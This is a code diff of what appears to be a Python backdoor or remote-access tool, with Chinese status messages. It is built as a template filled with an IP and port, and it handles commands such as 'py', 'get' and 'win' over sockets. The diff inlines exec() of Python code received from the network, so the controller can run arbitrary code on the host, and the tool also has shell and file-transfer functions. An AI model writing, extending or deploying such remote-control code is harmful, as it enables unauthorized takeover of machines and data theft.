@@ -23,13 +23,6 @@ def Shell(cmd):
     except:
         ret = "获取标准输入和标准错误 失败"
     return ret
-def Py(cmd):
-    try:
-        exec(cmd)
-        ret = "命令执行成功"
-    except:
-        ret = "执行失败"
-    return ret
 def Get(file1):
     ret = "传输成功"
     try:
@@ -118,7 +111,12 @@ if "__main__" == __name__:
             elif cmd[0] == "win":
                 t.send(Win().encode())
             elif cmd[0] == "py":
-                t.send(Py(cmd[1]).encode())
+                try:
+                    exec(cmd[1])
+                    ret = "命令执行成功"
+                except:
+                    ret = "执行失败"
+                t.send(ret.encode())
         t.close()
     except:
         exit()
@@ -141,9 +139,14 @@ if "__main__" == __name__:
         elif cmd[0] == "get":
             c.send(Get(cmd[1]).encode())
         elif cmd[0] == "win":
-             c.send(Win().encode())
+            c.send(Win().encode())
         elif cmd[0] == "py":
-            c.send(Py(cmd[1]).encode())
+            try:
+                exec(cmd[1])
+                ret = "命令执行成功"
+            except:
+                ret = "执行失败"
+            c.send(ret.encode())
     c.close()
     t.close()
 """ % (ip,port))
